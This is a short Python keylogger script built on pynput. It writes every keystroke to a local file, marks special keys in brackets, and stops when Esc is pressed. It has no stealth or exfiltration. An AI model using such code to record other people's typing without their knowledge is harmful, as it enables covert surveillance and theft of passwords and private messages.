from pynput import keyboard

# Log file where keystrokes will be saved
log_file = "key_log.txt"

# Function to handle key presses
def on_press(key):
    with open(log_file, "a") as f:
        # Check if the key is a normal character
        if hasattr(key, 'char'):  # This handles regular characters
            f.write(key.char)
        else:
            # Handle special keys like space, enter, backspace, etc.
            if key == keyboard.Key.space:
                f.write(" ")  # Write space for Key.space
            elif key == keyboard.Key.enter:
                f.write("\n")  # Write newline for Key.enter
            elif key == keyboard.Key.backspace:
                f.write("[Backspace]")  # Write [Backspace] for Key.backspace
            else:
                f.write(f"[{key}]")  # For other special keys, write them in brackets

# Function to handle key releases (specifically to stop the keylogger)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener when the Esc key is pressed
        return False

# Start the listener to track key presses and releases
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
